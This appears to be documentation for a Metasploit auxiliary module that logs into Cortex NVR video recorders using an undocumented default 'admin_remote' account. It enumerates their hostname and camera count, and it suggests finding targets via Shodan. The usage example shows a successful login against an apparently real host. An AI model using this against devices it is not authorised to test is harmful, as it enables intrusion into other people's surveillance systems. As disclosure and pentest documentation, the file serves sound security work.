## Intro

This module attempts a login on host (default API port 50000) using default 'admin_remote' username with default credentials to enumerate NVR hostname and the number of cameras present on the system. Notably on previous iterations of the OS, this user is not publicised in installer/owner documentation and as such is present on many systems in the field.

## Setup

Locate Cortex NVR (E.G. Known device or Shodan.io search using 'Qvis')

## Verification Steps

1. Do: `msfconsole`
2. Do: `use auxiliary/gather/cortex_remote_user`
3. Do: `set RHOSTS <ip/domain>`
4. Do: `run`

## Usage

```
msf> use auxiliary/gather/cortex_remote_user.rb
msf auxiliary(gather/cortex_remote_user.rb) > set RHOSTS adata.dvrdns.org
msf auxiliary(gather/cortex_remote_user.rb) > run

[+] adata.dvrdns.org:50000 - successfully logged into admin_remote
[+] adata.dvrdns.org:50000 - get_dvr_name qvis-1d314b
[+] adata.dvrdns.org:50000 - 21 cameras present
[+] adata.dvrdns.org:50000 - logout

[*] Auxiliary module execution completed
```
